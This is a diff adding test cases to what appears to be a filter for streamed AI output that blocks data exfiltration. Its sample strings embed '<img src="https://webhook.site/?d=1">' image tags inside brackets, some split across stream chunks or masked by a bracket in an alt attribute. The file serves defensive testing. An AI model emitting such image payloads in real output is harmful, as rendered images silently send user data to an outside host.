@@ -79,6 +79,12 @@ describe('ExfilStreamHold', () => {
     expect(run(['[a [b](https://webhook.site/?d=1) c]'])).toBeNull()
   })
 
+  it('cuts an <img inside brackets that are not a link', () => {
+    expect(run(['[ <img src="https://webhook.site/?d=1"> ]'])).toBeNull()
+    expect(run(['[<img src="https://webhook.site/', '?d=1"> x] tail'])).toBeNull()
+    expect(run(['[<img alt="a]" src="https://webhook.site/?d=1">'])).toBeNull()
+  })
+
   it('sees an <img that opens across two events', () => {
     const hold = new ExfilStreamHold(isExfil)
     expect(hold.push(anthropic('x <im'))).toBe(anthropic('x <im'))
